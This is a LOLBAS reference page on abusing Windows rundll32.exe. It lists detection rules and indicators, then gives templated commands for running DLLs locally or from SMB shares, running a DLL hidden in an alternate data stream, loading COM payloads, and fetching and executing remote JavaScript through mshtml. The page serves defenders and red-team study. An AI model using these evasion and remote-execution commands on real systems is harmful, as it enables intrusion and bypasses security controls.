---
title: "Rundll32.exe"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/Binaries/Rundll32/
fetched_at: 2026-09-20T17:11:26Z
license: unspecified
category: windows
---

Used by Windows to execute dll files

## Paths
- C:\Windows\System32\rundll32.exe
- C:\Windows\SysWOW64\rundll32.exe

## Resources
- [https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/](https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/)
- [https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_7](https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_7)
- [https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/](https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/)
- [https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/](https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/)
- [https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/](https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/)
- [https://github.com/sailay1996/expl-bin/blob/master/obfus.md](https://github.com/sailay1996/expl-bin/blob/master/obfus.md)
- [https://github.com/sailay1996/misc-bin/blob/master/rundll32.md](https://github.com/sailay1996/misc-bin/blob/master/rundll32.md)
- [https://nasbench.medium.com/a-deep-dive-into-rundll32-exe-642344b41e90](https://nasbench.medium.com/a-deep-dive-into-rundll32-exe-642344b41e90)
- [https://www.cybereason.com/blog/rundll32-the-infamous-proxy-for-executing-malicious-code](https://www.cybereason.com/blog/rundll32-the-infamous-proxy-for-executing-malicious-code)

## Acknowledgements
- Casey Smith ([@subtee](https://twitter.com/@subtee))
- Oddvar Moe ([@oddvarmoe](https://twitter.com/@oddvarmoe))
- Jimmy ([@bohops](https://twitter.com/@bohops))
- Sailay ([@404death](https://twitter.com/@404death))
- Martin Ingesen ([@Mrtn9](https://twitter.com/@Mrtn9))

## Detections
- Sigma: [https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/network_connection/net_connection_win_rundll32_net_connections.yml](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/network_connection/net_connection_win_rundll32_net_connections.yml)
- Sigma: [https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml)
- Elastic: [https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_unusual_network_connection_via_rundll32.toml](https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_unusual_network_connection_via_rundll32.toml)
- IOC: Outbount Internet/network connections made from rundll32
- IOC: Suspicious use of cmdline flags such as -sta

## Execute

1. First part should be a DLL file (any extension accepted), EntryPoint should be the name of the entry point in the DLL file to execute.

```
rundll32.exe {PATH},EntryPoint
```

   - Use case: Execute DLL file

   - Privileges required: User

   - Operating systems: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

   - ATT&CK® technique: T1218.011

   - Tags: Execute: DLL

2. Execute a DLL from an SMB share. EntryPoint is the name of the entry point in the DLL file to execute.

```
rundll32.exe {PATH_SMB:.dll},EntryPoint
```

   - Use case: Execute DLL from SMB share.

   - Privileges required: User

   - Operating systems: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

   - ATT&CK® technique: T1218.011

   - Tags: Execute: DLLExecute: Remote

3. Use Rundll32.exe to execute a JavaScript script that calls a remote JavaScript script.

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:{REMOTEURL}")
```

   - Use case: Execute code from Internet

   - Privileges required: User

   - Operating systems: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

   - ATT&CK® technique: T1218.011

   - Tags: Execute: JScript

4. Use Rundll32.exe to load a registered or hijacked COM Server payload. Also works with ProgID.

```
rundll32.exe -sta {CLSID}
```

   - Use case: Execute a DLL/EXE COM server payload or ScriptletURL code.

   - Privileges required: User

   - Operating systems: Windows 10 (and likely previous versions), Windows 11

   - ATT&CK® technique: T1218.011

   - Tags: Execute: COM

5. Use Rundll32.exe to execute a .DLL file stored in an Alternate Data Stream (ADS).

```
rundll32 "{PATH}:ADSDLL.dll",DllMain
```

   - Use case: Execute code from alternate data stream

   - Privileges required: User

   - Operating systems: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

   - ATT&CK® technique: T1564.004

   - Tags: Execute: DLL
